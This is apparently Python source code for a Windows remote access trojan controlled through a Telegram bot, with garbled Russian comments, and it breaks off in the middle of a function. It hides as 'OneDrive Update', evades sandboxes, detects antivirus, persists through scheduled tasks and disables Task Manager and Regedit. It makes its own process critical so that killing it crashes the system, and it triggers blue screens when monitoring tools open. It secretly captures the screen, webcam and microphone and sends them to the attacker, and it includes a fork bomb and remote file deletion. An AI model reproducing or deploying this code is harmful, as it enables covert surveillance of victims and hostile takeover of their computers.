# -*- coding: utf8 -*-

import re
import os
import sys
import cv2
import wave
import glob
import time
import shutil
import telebot
import sqlite3
import pyaudio
import requests
import platform
import pyperclip
import subprocess
import win32crypt
import json,base64
import urllib.request
from PIL import ImageGrab
from telebot import types
from telebot import util
from telebot import apihelper
from ctypes import *
from ctypes.wintypes import *
from urllib.error import HTTPError
from subprocess import Popen, PIPE
from os import system



#–¢–æ–∫–µ–Ω/–ê–π–¥–∏
TelegramToken = 'TOKEN'
TelegramChatID = 'ID'

#–ü—Ä–æ–∫—Å–∏
Proxy = False
Ip = 'Ip'
Port = 'Port'


#–ó–∞–ø—É—Å–∫–∞—Ç—å –æ—Ç –∏–º–µ–Ω–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
AdminRightsRequired = False


#–û—Ç–∫–ª—é—á–∞—Ç—å –î–∏—Å–ø–µ—Ç—á–µ—Ä –ó–∞–¥–∞—á –ø—Ä–∏ –ø–µ—Ä–≤–æ–º –∑–∞–ø—É—Å–∫–µ
DisableTaskManager = False
#–û—Ç–∫–ª—é—á–∞—Ç—å –†–µ–¥–∞–∫—Ç–æ—Ä –†–µ–µ—Å—Ç—Ä–∞ –ø—Ä–∏ –ø–µ—Ä–≤–æ–º –∑–∞–ø—É—Å–∫–µ
DisableRegistryTools = False


#–î–æ–±–∞–≤–ª—è—Ç—å –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É –ø—Ä–∏ –ø–µ—Ä–≤–æ–º –∑–∞–ø—É—Å–∫–µ
AutorunEnabled = False
#–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –¥–ª—è –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è —Ñ–∞–π–ª–∞
InstallPath = 'C:\\ProgramData'
#–ò–º—è —Ñ–∞–π–ª–∞ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–µ
AutorunName = 'OneDrive Update'
#–ò–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –≤ –¥–∏—Å–ø–µ—Ç—á–µ—Ä–µ –∑–∞–¥–∞—á
ProcessName = 'System'


#–í—ã–≤–æ–¥–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ
DisplayMessageBox = False
#–ó–∞–≥–æ–ª–æ–≤–æ–∫ —Å–æ–æ–±—â–µ–Ω–∏—è
MessageHeader = 'MessageHeader'
#–°–æ–æ–±—â–µ–Ω–∏–µ
Message = 'Message'


#–ó–∞—â–∏—Ç–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞ –æ—Ç –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –∏ —É–¥–∞–ª–µ–Ω–∏—è
ProcessBSODProtectionEnabled = False
#–°–∫–∞–Ω–∏—Ä–æ–≤–∞—Ç—å –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
MakeBSODWhenProcessStarted = False
#–°–ø–∏—Å–æ–∫ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ (BSoD –ø—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏)
BlacklistedProcesses = (
    'taskmgr.exe',
    'processhacker.exe',
    'regedit.exe',
    'mmc.exe',
    'perfmon.exe'
)



bot = telebot.TeleBot(TelegramToken, threaded=True)
bot.worker_pool = util.ThreadPool(num_threads=50)

menu = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/1\n<<')
button2 = types.KeyboardButton('/2\n>>')
button3 = types.KeyboardButton('/Screen\nüñº')
button4 = types.KeyboardButton('/Webcam\nüì∏')
button5 = types.KeyboardButton('/Video\nüé•')
button6 = types.KeyboardButton('/Audio\nüéô')
button7 = types.KeyboardButton('/Power\nüî¥')
button8 = types.KeyboardButton('/Autorun\nüîµ')
menu.row(button1, button3, button2)
menu.row(button4, button5, button6)
menu.row(button7, button8)

main2 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('–í—ã–∫–ª—é—á–∏—Ç—å - ‚õîÔ∏è', callback_data='shutdown')
button2 = types.InlineKeyboardButton('–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å - ‚≠ïÔ∏è', callback_data='reboot')
button3 = types.InlineKeyboardButton('–í—ã–π—Ç–∏ –∏–∑ —Å–∏—Å—Ç–µ–º—ã - üí¢', callback_data='logoff')
button4 = types.InlineKeyboardButton('–°–∏–Ω–∏–π —ç–∫—Ä–∞–Ω —Å–º–µ—Ä—Ç–∏ - üåÄ', callback_data='bsod')
button5 = types.InlineKeyboardButton('¬´ –ù–∞–∑–∞–¥', callback_data='cancel')
main2.row(button1)
main2.row(button2)
main2.row(button3)
main2.row(button4)
main2.row(button5)

main3 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('–°–æ—Ö—Ä–∞–Ω–∏—Ç—å - üì•', callback_data='startup')
button2 = types.InlineKeyboardButton('–£–¥–∞–ª–∏—Ç—å - ‚ôªÔ∏è', callback_data='uninstall')
button3 = types.InlineKeyboardButton('¬´ –ù–∞–∑–∞–¥', callback_data='cancel')
main3.row(button1)
main3.row(button2)
main3.row(button3)

main4 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('–î–∞, —É–¥–∞–ª–∏—Ç—å', callback_data='confirm')
button2 = types.InlineKeyboardButton('–ù–µ —É–¥–∞–ª—è—Ç—å', callback_data='cancel')
button3 = types.InlineKeyboardButton('¬´ –ù–∞–∑–∞–¥', callback_data='cancel')
main4.row(button1)
main4.row(button2)
main4.row(button3)

main5 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/3\n<<')
button2 = types.KeyboardButton('/Screen\nüñº')
button3 = types.KeyboardButton('/4\n>>')
button4 = types.KeyboardButton('/Files\nüíæ')
button5 = types.KeyboardButton('/Tasklist\nüìã')
button6 = types.KeyboardButton('/Taskkill\nüìù')
main5.row(button1, button2, button3)
main5.row(button4)
main5.row(button5, button6)

main6 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('–û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –≤—Å–µ –ø—Ä–æ—Ü–µ—Å—Å—ã', callback_data='taskkill all')
button2 = types.InlineKeyboardButton('–û—Ç–∫–ª—é—á–∏—Ç—å –¥–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á', callback_data='disabletaskmgr')
main6.row(button1)
main6.row(button2)

main7 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/CD\nüóÇ')
button2 = types.KeyboardButton('/Upload\nüì°')
button3 = types.KeyboardButton('/ls\nüìÑ')
button4 = types.KeyboardButton('/Remove\nüóë')
button5 = types.KeyboardButton('/Download\nüì®')
button6 = types.KeyboardButton('/Run\nüìå')
button7 = types.KeyboardButton('/Cancel')
main7.row(button1, button2, button3)
main7.row(button4, button5, button6)
main7.row(button7)

main8 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/5\n<<')
button2 = types.KeyboardButton('/Screen\nüñº')
button3 = types.KeyboardButton('/6\n>>')
button4 = types.KeyboardButton('/Message\nüí¨')
button5 = types.KeyboardButton('/Speak\nüì¢')
button6 = types.KeyboardButton('/OpenURL\nüåê')
button7 = types.KeyboardButton('/Wallpapers\nüß©')
button8 = types.KeyboardButton('/ForkBomb\n‚è±')
main8.row(button1, button2, button3)
main8.row(button4, button5)
main8.row(button6, button7, button8)


# Variables

ProgramFiles = os.environ['ProgramW6432']+'\\'
ProgramFiles86 = os.environ['ProgramFiles(x86)']+'\\'
ProgramData = os.environ['ProgramData']+'\\'
Temp = os.environ['TEMP']+'\\'

Expansion = os.path.splitext(os.path.basename(sys.argv[0]))[1]
CurrentName = os.path.basename(sys.argv[0])
CurrentPath = sys.argv[0]
ProcessName = ProcessName+Expansion


# AntiBot (VirusTotal)

for file in glob.glob('C:\\Users\\John\\Desktop\\foobar.*'):
 sys.exit()
for file in glob.glob('C:\\Users\\Peter Wilson\\Desktop\\Microsoft Word 2010.lnk'):
 sys.exit()
for file in glob.glob('C:\\Users\\Lisa\\Desktop'):
 sys.exit()


# Detect installed antivirus software

if os.path.exists(ProgramFiles+'Windows Defender'):
   av = 'Windows Defender'
if os.path.exists(ProgramFiles+'AVAST Software\\Avast'):
   av = 'Avast'
if os.path.exists(ProgramFiles+'AVG\\Antivirus'):
   av = 'AVG'
if os.path.exists(ProgramFiles86+'Avira\\Launcher'):
   av = 'Avira'
if os.path.exists(ProgramFiles86+'IObit\\Advanced SystemCare'):
   av = 'Advanced SystemCare'
if os.path.exists(ProgramFiles+'Bitdefender Antivirus Free'):
   av = 'Bitdefender'
if os.path.exists(ProgramFiles+'DrWeb'):
   av = 'Dr.Web'
if os.path.exists(ProgramFiles+'ESET\\ESET Security'):
   av = 'ESET'
if os.path.exists(ProgramFiles86+'Kaspersky Lab'):
   av = 'Kaspersky'
if os.path.exists(ProgramFiles86+'360\\Total Security'):
   av = '360 Total Security'


"""Script functions"""


# Proxy Setting

def SetProxy(Ip, Port):
 apihelper.proxy = {'https': 'socks5://{}:{}'.format(Ip,Port)}


# Run as administrator

def WhileRunAS(File):
 while True:
  try:
   os.startfile(File, 'runas')
  except:
   pass
  else:
   break


# Check if the script is run as administrator

def AdminChecker():
 try:
  admin = os.getuid() == 0
 except AttributeError:
  admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 if admin is False:
  sys.exit()


# Disabling Task Manager and Regedit

def RegeditDisableTaskManager():
 directory = ProgramData
 with open(os.path.join(directory, 'DisableTaskManager.bat'), 'w') as OPATH:
   OPATH.writelines([
       'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f'])

def RegeditDisableRegistryTools():
 directory = ProgramData
 with open(os.path.join(directory, 'DisableRegistryTools.bat'), 'w') as OPATH:
   OPATH.writelines([
       'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f'])


# Adding a script to startup

def AddToAutorun(AutorunName, InstallPath, ProcessName):
 directory = Temp
 with open(os.path.join(directory, 'AutorunEnabled.bat'), 'w') as OPATH:
   OPATH.writelines([
       'schtasks /create /f /sc onlogon /rl highest /tn "'+AutorunName+'" /tr "'+InstallPath+'\\'+ProcessName+'"'])
 while True:
  try:
   os.startfile(Temp+'AutorunEnabled.bat', 'runas')
  except:
   pass
  else:
   shutil.copy2(CurrentPath, r''+InstallPath+'\\'+ProcessName)
   ctypes.windll.kernel32.SetFileAttributesW(InstallPath+'\\'+ProcessName, 2)
   break


# MessageBox Output

def MessageBox(Message):
 ctypes.windll.user32.MessageBoxW(0, Message, u''+MessageHeader, 0x10)


# Protect process with BSoD (if killed).

def SetProtection():
 windll.ntdll.RtlAdjustPrivilege(20, 1, 0, byref(c_bool()))
 windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0

def UnsetProtection():
 windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0

if ProcessBSODProtectionEnabled is True:
 try:
  admin = os.getuid() == 0
 except AttributeError:
  admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 if admin is False:
  WhileRunAS(CurrentPath)
  SetProtection()
 if admin is True:
  SetProtection()

if ProcessBSODProtectionEnabled is True:
 Argument = none_stop = True
 AdminChecker()
else:
 Argument = ''


# BSoD if a forbidden process is open

def List():
 processes = []
 process = subprocess.check_output("@chcp 65001 1> NUL && @TASKLIST /FI \"STATUS eq RUNNING\" | find /V \"Image Name\" | find /V \"=\"",
     shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode(encoding="utf8", errors="strict")
 for processNames in process.split(' '):
  if ".exe" in processNames:
   proc = processNames.replace("K\r\n", '').replace("\r\n", '')
   processes.append(proc)
 return processes

def CheckProcess():
 for process in List():
  if process.lower() in BlacklistedProcesses:
   return True
 return False


"""Functions"""


# Takes a screenshot

def TakeScreenshot(File):
 Screen = ImageGrab.grab()
 Screen.save(File)


# Takes a photo from a webcam

def TakeWebcamPhoto(File):
 cap = cv2.VideoCapture(0)
 for i in range(30):
    cap.read()
 ret, frame = cap.read()
 cv2.imwrite(File, frame)
 cap.release()


# Records webcam video

def VideoRecorder(Seconds, File):
 capture_duration = float(Seconds)
 cap = cv2.VideoCapture(0)
 fourcc = cv2.VideoWriter_fourcc(*'XVID')
 out = cv2.VideoWriter(File,fourcc, 20.0, (640,480))
 start_time = time.time()
 while( int(time.time() - start_time) < capture_duration ):
    ret, frame = cap.read()
    if ret==True:
        frame = cv2.flip(frame,1)
        out.write(frame)
    else:
        break
 cap.release()
 out.release()
 cv2.destroyAllWindows()


#Records audio from a microphone

def AudioRecorder(Seconds, File):
 CHUNK = 1024
 FORMAT = pyaudio.paInt16
 CHANNELS = 2
 RATE = 44100
 RECORD_SECONDS = float(Seconds)
 WAVE_OUTPUT_FILENAME = File
 p = pyaudio.PyAudio()
 stream = p.open(format=FORMAT,
                channels=CHANNELS,
                rate=RATE,
                input=True,
                frames_per_buffer=CHUNK)
 frames = []
 for i in range(0, int(RATE/CHUNK * RECORD_SECONDS)):
    data = stream.read(CHUNK)
    frames.append(data)
 stream.stop_stream()
 stream.close()
 p.terminate()
 wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
 wf.setnchannels(CHANNELS)
 wf.setsampwidth(p.get_sample_size(FORMAT))
 wf.setframerate(RATE)
 wf.writeframes(b''.join(frames))
 wf.close()


# Sends a message

def SendMessage(call, text):
 bot.edit_message_text(chat_id=call.message.chat.id,
 message_id=call.message.message_id, text=text, parse_mode="Markdown")


# Turns off the computer

def Shutdown():
 system('@shutdown /s /f /t 0')


# Restarts computer

def Reboot():
 system('@shutdown /r /f /t 0')

# Ends user session

def Logoff():
 system('@shutdown /f /l')


# Blue screen of death

def BSoD():
 ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(c_bool()))
 ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, byref(DWORD()))


# Gets a list of active processes

def ProcessList():
 Calling = Popen('tasklist', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE).stdout.readlines()
 Process = [Calling[i].decode('cp866', 'ignore').split()[0].split('.exe')[0] for i in range(3,len(Calling))]
 strProcess = '\n'.join(Process)
 return strProcess


# Ends the selected process

def KillProcess(Process):
 subprocess.Popen('taskkill /f /im '+Process+'.exe')


# Gets the title of the active window

def WindowTitle():
 hWnd = windll.user32.GetForegroundWindow()
 length = windll.user32.GetWindowTextLengthW(hWnd)
 buf = create_unicode_buffer(length + 1)
 windll.user32.GetWindowTextW(hWnd, buf, length + 1)
 if buf.value:
     return buf.value
 else:
     return None


# Displays a message on the screen

def SendMessageBox(Message):
 ctypes.windll.user32.MessageBoxW(0, Message, u'', 0x40)


# Opens a browser link

def OpenBrowser(URL):
 if not URL.startswith('http'):
     URL = 'http://' + URL
 return system(f'@start {URL} > NUL')


# Receive a photo from a Telegram Chat

def GetPhoto(Photo, command):
 file_info = bot.get_file(command.photo[len(command.photo)-1].file_id)
 downloaded_file = bot.download_file(file_info.file_path)
 src = ProgramData+'Files\\'+file_info.file_path;
 with open(src, 'wb') as new_file:
   new_file.write(downloaded_file)


# Sets a photo on the desktop wallpaper

def SetWallpapers(Photo):
 ctypes.windll.user32.SystemParametersInfoW(20, 0, ProgramData+'Files\\'+Photo.file_path, 0)


# Speaks text

def SpeakText(Text):
 from win32com.client import constants, Dispatch
 speaker = Dispatch('SAPI.SpVoice')
 speaker.Speak(Text)
 del speaker


# Infinitely creates copies of selected programs

def ForkBomb():
 while True:
  try:
   os.startfile('cmd.exe')
   os.startfile('calc.exe')
   os.startfile('notepad.exe')
  except:
   pass


# Sets text to clipboard

def SetClipboard(Text):
 pyperclip.copy(Text)


# Get text from clipboard

def GetClipboard():
 return pyperclip.paste()


# Blocks mouse and keyboard movements

def Block(Seconds):
 windll.user32.BlockInput(True)
 time.sleep(Seconds)
 windll.user32.BlockInput(False)



"""Function handlers"""



if Proxy is True:
 SetProxy(Ip, Port)


if AdminRightsRequired is True:
 try:
  admin = os.getuid() == 0
 except AttributeError:
  admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 if admin is False:
  WhileRunAS(CurrentPath)
  print('[+] ‚Ä∫ '+CurrentName+' –æ—Ç–∫—Ä—ã—Ç –æ—Ç –∏–º–µ–Ω–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞!\n')


if AdminRightsRequired is True:
 AdminChecker()


if DisableTaskManager is True:
 try:
  if os.path.exists(ProgramData+'DisableTaskManager.bat'):
   pass
  else:
   RegeditDisableTaskManager()
   WhileRunAS(ProgramData+'DisableTaskManager.bat')
   print('[+] ‚Ä∫ –î–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á –æ—Ç–∫–ª—é—á–µ–Ω!\n')
 except:
  pass


if DisableRegistryTools is True:
 try:
  if os.path.exists(ProgramData+'DisableRegistryTools.bat'):
   pass
  else:
   time.sleep(1)
   RegeditDisableRegistryTools()
   WhileRunAS(ProgramData+'DisableRegistryTools.bat')
   print('[+] ‚Ä∫ –†–µ–¥–∞–∫—Ç–æ—Ä —Ä–µ–µ—Å—Ç—Ä–∞ –æ—Ç–∫–ª—é—á–µ–Ω!\n')
 except:
  pass


if AutorunEnabled is True:
 try:
  if os.path.exists(InstallPath+'\\'+ProcessName):
   pass
  else:
   AddToAutorun(AutorunName, InstallPath, ProcessName)
   print('[+] ‚Ä∫ '+CurrentName+' ‚Äπ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É ‚Ä∫ '+InstallPath+'\\'+ProcessName+'\n')
 except:
  pass


if DisplayMessageBox is True:
 try:
  if os.path.exists(Temp+'MessageBox'):
   pass
  else:
   open(Temp+'MessageBox', 'a').close()
   MessageBox(Message)
   print('[+] ‚Ä∫ –°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!\n')
 except:
  pass


if ProcessBSODProtectionEnabled is True:
 try:
  admin = os.getuid() == 0
 except AttributeError:
  admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 if admin is False:
  WhileRunAS(CurrentPath)
  SetProtection()
  print('[+] ‚Ä∫ –ó–∞—â–∏—Ç–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞!')
 if admin is True:
  SetProtection()
  print('[+] ‚Ä∫ –ó–∞—â–∏—Ç–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞!')


"""Calling functions through commands"""


while True:
 try:
  try:
   admin = os.getuid() == 0
  except AttributeError:
   admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
  if admin is True:
   Online = 'üîò Online!'
  else:
   Online = 'üü¢ Online!'

  r = requests.get('http://ip.42.pl/raw')
  IP = r.text
  bot.send_message(TelegramChatID, 
  '\n'+Online+'\n'
  '\nPC ¬ª '+os.getlogin()+
  '\nOS ¬ª '+platform.system()+' '+platform.release()+
  '\n'
  '\nAV ¬ª '+av+
  '\n'
  '\nIP ¬ª '+IP,
  reply_markup=menu)

  if os.path.exists(ProgramData+'Files'):
    pass
  else:
    os.makedirs(ProgramData+'Files')
    os.makedirs(ProgramData+'Files\\Documents')
    os.makedirs(ProgramData+'Files\\Photos')
 except:
   print('[-] ‚Ä∫ –ù–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è')
 else:
   print('[+] ‚Ä∫ –ü–æ–¥–∫–ª—é—á–µ–Ω–æ')
   break


if MakeBSODWhenProcessStarted is True:
 while True:
  try:
   if CheckProcess() is True:
    BSoD()
  except:
   pass


@bot.message_handler(regexp='/Screen')
def Screen(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_photo')
  File = Temp+'Screenshot.jpg'
  TakeScreenshot(File)
  Screen = open(File, 'rb')
  bot.send_photo(command.chat.id, Screen)
 except:
  pass


@bot.message_handler(regexp='/Webcam')
def Webcam(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_photo')
  File = Temp+'Webcam.jpg'
  TakeWebcamPhoto(File)
  Webcam = open(File, 'rb')
  bot.send_photo(command.chat.id, Webcam)
 except:
  bot.send_message(command.chat.id, '*–ö–∞–º–µ—Ä–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞*', parse_mode="Markdown")


@bot.message_handler(regexp='/Video')
def Video(command):
 try:
  Seconds = re.split('/Video ', command.text, flags=re.I)[1]
  bot.send_message(command.chat.id, '*–ó–∞–ø–∏—Å—ã–≤–∞–µ–º...*', parse_mode="Markdown")
  bot.send_chat_action(command.chat.id, 'upload_video')
  try:
   File = Temp+'Video.mp4'
   VideoRecorder(Seconds, File)
   Video = open(File, 'rb')
   bot.send_animation(command.chat.id, Video)
  except ValueError:
   bot.send_message(command.chat.id, '*–û—à–∏–±–∫–∞ –∑–Ω–∞—á–µ–Ω–∏—è*', parse_mode="Markdown")
  except:
   bot.send_message(command.chat.id, '*–ö–∞–º–µ—Ä–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*–£–∫–∞–∂–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–ø–∏—Å–∏\n\n‚Ä∫ /Video*', parse_mode="Markdown")


@bot.message_handler(regexp='/Audio')
def Audio(command):
 try:
  Seconds = re.split('/Audio ', command.text, flags=re.I)[1]
  bot.send_message(command.chat.id, '*–ó–∞–ø–∏—Å—ã–≤–∞–µ–º...*', parse_mode="Markdown")
  bot.send_chat_action(command.chat.id, 'record_audio')
  try:
   File = Temp+'Audio.wav'
   AudioRecorder(Seconds, File)
   Audio = open(File, 'rb')
   bot.send_voice(command.chat.id, Audio)
  except ValueError:
   bot.send_message(command.chat.id, '*–û—à–∏–±–∫–∞ –∑–Ω–∞—á–µ–Ω–∏—è*', parse_mode="Markdown")
  except:
   bot.send_message(command.chat.id, '*–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø–∏—Å–∞—Ç—å –∞—É–¥–∏–æ*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*–£–∫–∞–∂–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–ø–∏—Å–∏\n\n‚Ä∫ /Audio*', parse_mode="Markdown")


@bot.callback_query_handler(func=lambda call: True)
def callback_inline(command):
 if command.message:
  if command.data == 'shutdown':
   try:
    SendMessage(command, '*–ö–æ–º–ø—å—é—Ç–µ—Ä –≤—ã–∫–ª—é—á–µ–Ω!*')
    Shutdown()
   except:
    pass


  if command.data == 'reboot':
   try:
    SendMessage(command, '*–ö–æ–º–ø—å—é—Ç–µ—Ä –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∂–µ–Ω!*')
    Reboot()
   except:
    pass


  if command.data == 'logoff':
   try:
    SendMessage(command, '*–°–µ–∞–Ω—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω!*')
    Logoff()
   except:
    pass


  if command.data == 'bsod':
   try:
    SendMessage(command, '*BSoD –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω!*')
    BSoD()
   except:
    pass


  if command.data == 'startup':
   try:
    if os.path.exists(InstallPath+'\\'+ProcessName):
     SendMessage(command, '*'+ProcessName+'* —É–∂–µ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–µ!')
    else:
     AddToAutorun(AutorunName, InstallPath, ProcessName)
     os.startfile(InstallPath+'\\'+ProcessName)
     SendMessage(command, '*'+ProcessName+'* —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É!')
   except:
    SendMessage(command, '*–û—à–∏–±–∫–∞*')


  if command.data == 'uninstall':
   bot.edit_message_text(chat_id=command.message.chat.id,
   message_id=command.message.message_id, text='*–í—ã —É–≤–µ—Ä–µ–Ω—ã?*', reply_markup=main4, parse_mode="Markdown")


  if command.data == 'confirm':
   try:
    SendMessage(command, '*'+CurrentName+'* —É–¥–∞–ª–µ–Ω!')
    UnsetProtection()
    ctypes.windll.kernel32.SetFileAttributesW(CurrentPath, 0)
    ctypes.windll.kernel32.SetFileAttributesW(InstallPath+'\\'+ProcessName, 0)
    directory = Temp
    with open(os.path.join(directory, 'Uninstaller.bat'), 'w') as OPATH:
      OPATH.writelines(['taskkill /f /im "'+CurrentName+'"\n', 
                        'schtasks /delete /f /tn "'+AutorunName+'"\n', 
                        'del /s /q "'+CurrentPath+'"\n',
                        'del /s /q "'+InstallPath+'\\'+ProcessName+'"\n',
                        'rmdir /s /q "'+ProgramData+'Files'+'"'])
    WhileRunAS(Temp+'Uninstaller.bat')
   except:
    SendMessage(command, '*–û—à–∏–±–∫–∞*')


  if command.data == 'taskkill all':
   try:
    SendMessage(command, '*–û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º...*')
    directory = Temp
    with open(os.path.join(directory, 'taskkill.bat'), 'w') as OPATH:
      OPATH.writelines([
        'if "%~1"=="" (set "x=%~f0"& start "" /min "%comspec%" /v/c "!x!" any_word & exit /b)\n', 
        'taskkill /f /fi "USERNAME eq %username%" /fi "IMAGENAME ne explorer.exe USERNAME eq %username%" /fi "IMAGENAME ne "'+CurrentName+'"'])
    os.startfile(Temp+'taskkill.bat')
    SendMessage(command, '*–í—Å–µ –ø—Ä–æ—Ü–µ—Å—Å—ã –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã!*')
   except:
    pass


  if command.data == 'disabletaskmgr':
   try:
    if os.path.exists(ProgramData+'DisableTaskManager.bat'):
      SendMessage(command, '*–î–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á —É–∂–µ –æ—Ç–∫–ª—é—á–µ–Ω!*')
    else:
     RegeditDisableTaskManager()
     WhileRunAS(ProgramData+'DisableTaskManager.bat')
     SendMessage(command, '*–î–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á –æ—Ç–∫–ª—é—á–µ–Ω!*')
   except:
    pass


  if command.data == 'cancel':
    SendMessage(command, '`...`')


@bot.message_handler(regexp='/CD')
def CD(command):
 try:
  path = re.split('/CD ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  os.chdir(path)
  bot.send_message(command.chat.id, '*–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –∏–∑–º–µ–Ω–µ–Ω–∞*\n\n`'+os.getcwd()+'`', parse_mode="Markdown")
 except FileNotFoundError:
  bot.send_message(command.chat.id, '*–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*–¢–µ–∫—É—â–∞—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è*\n\n`'+os.getcwd()+'`\n\n*–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è*\n\n`'+os.getlogin()+'`', parse_mode="Markdown")


@bot.message_handler(regexp='/ls')
def ls(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')
  dirs = '\n``'.join(os.listdir())
  bot.send_message(command.chat.id, '`'+os.getcwd() + '`\n\n'+'`' + dirs+'`', parse_mode="Markdown")
 except:
  try:
   dirse = '\n'.join(os.listdir())
   splitted_text = util.split_string(dirse, 4096)
   for dirse in splitted_text:
     bot.send_message(command.chat.id, '`'+dirse+'`', parse_mode="Markdown")
  except PermissionError:
   bot.send_message(command.chat.id, '*–û—Ç–∫–∞–∑–∞–Ω–æ –≤ –¥–æ—Å—Ç—É–ø–µ*', parse_mode="Markdown")
  except:
   pass


@bot.message_handler(commands=['Remove', 'remove'])
def Remove(command):
 try:
  File = re.split('/Remove ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  created = os.path.getctime(os.getcwd()+'\\'+File)
  year,month,day,hour,minute,second=time.localtime(created)[:-3]
  def convert_bytes(num):
      for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
          if num < 1024.0:
              return "%3.1f %s" % (num, x)
          num /= 1024.0
  def file_size(file_path):
      if os.path.isfile(file_path):
          file_info = os.stat(file_path)
          return convert_bytes(file_info.st_size)
  bot.send_message(command.chat.id, 
    '–§–∞–π–ª *'+msg+'* —É–¥–∞–ª–µ–Ω!' 
    '\n' 
    '\n–°–æ–∑–¥–∞–Ω ¬ª %02d/%02d/%d'%(day,month,year)+
    '\n–†–∞–∑–º–µ—Ä ¬ª '+file_size(os.getcwd()+'\\'+File),
    parse_mode="Markdown")
  os.remove(os.getcwd()+'\\'+File)
 except:
  try:
   created = os.path.getctime(os.getcwd()+'\\'+File)
   year,month,day,hour,minute,second=time.localtime(created)[:-3]
   folder = os.getcwd()+'\\'+File
   folder_size = 0
   for (path, dirs, files) in os.walk(folder):
     for file in files:
       filename = os.path.join(path, file)
       folder_size += os.path.getsize(filename)
